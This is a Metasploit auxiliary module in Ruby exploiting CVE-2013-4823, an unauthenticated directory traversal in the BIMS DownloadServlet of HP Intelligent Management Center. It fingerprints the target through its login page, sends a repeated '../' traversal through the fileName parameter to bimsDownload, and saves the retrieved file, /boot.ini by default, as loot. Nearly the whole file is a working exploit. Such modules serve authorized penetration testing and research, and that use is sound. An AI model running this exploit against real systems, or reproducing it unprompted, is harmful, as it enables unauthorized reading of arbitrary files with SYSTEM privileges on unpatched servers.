##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'HP Intelligent Management BIMS DownloadServlet Directory Traversal',
      'Description'    => %q{
          This module exploits a lack of authentication and a directory traversal in HP
        Intelligent Management, specifically in the DownloadServlet from the BIMS component,
        in order to retrieve arbitrary files with SYSTEM privileges. This module has been
        tested successfully on HP Intelligent Management Center 5.1 E0202 with BIMS 5.1 E0201
        over Windows 2003 SP2.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'rgod <rgod[at]autistici.org>', # Vulnerability Discovery
          'juan vazquez' # Metasploit module
        ],
      'References'     =>
        [
          [ 'CVE', '2013-4823' ],
          [ 'OSVDB', '98248' ],
          [ 'BID', '62897' ],
          [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-13-239/' ]
        ]
    ))

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('TARGETURI', [true, 'Path to HP Intelligent Management Center', '/imc']),
        OptString.new('FILEPATH', [true, 'The name of the file to download', '/boot.ini']),
        # By default files downloaded from C:\Program Files\iMC\client\web\apps\imc\
        OptInt.new('DEPTH', [true, 'Traversal depth', 6])
      ], self.class)
  end

  def is_imc?
    res = send_request_cgi({
      'uri'      => normalize_uri(target_uri.path.to_s, "login.jsf"),
      'method'   => 'GET'
    })

    if res and res.code == 200 and res.body =~ /HP Intelligent Management Center/
      return true
    else
      return false
    end
  end

  def my_basename(filename)
    return ::File.basename(filename.gsub(/\\/, "/"))
  end

  def run_host(ip)

    if not is_imc?
      vprint_error("#{rhost}:#{rport} - This isn't a HP Intelligent Management Center")
      return
    end

    travs = ""
    travs << "../" * datastore['DEPTH']
    travs << datastore['FILEPATH']

    vprint_status("#{rhost}:#{rport} - Sending request...")
    res = send_request_cgi({
      'uri'          => normalize_uri(target_uri.path.to_s, "bimsDownload"),
      'method'       => 'GET',
      'vars_get'     =>
        {
          'fileName' => travs,
          'path'     => "/"
        }
    })

    if res and res.code == 200 and res.headers['Content-Type'] and res.headers['Content-Type'] == "application/doc"
      contents = res.body
      fname = my_basename(datastore['FILEPATH'])
      path = store_loot(
        'hp.imc.bimsdownloadservlet',
        'application/octet-stream',
        ip,
        contents,
        fname
      )
      print_good("#{rhost}:#{rport} - File saved in: #{path}")
    else
      vprint_error("#{rhost}:#{rport} - Failed to retrieve file")
      return
    end
  end
end
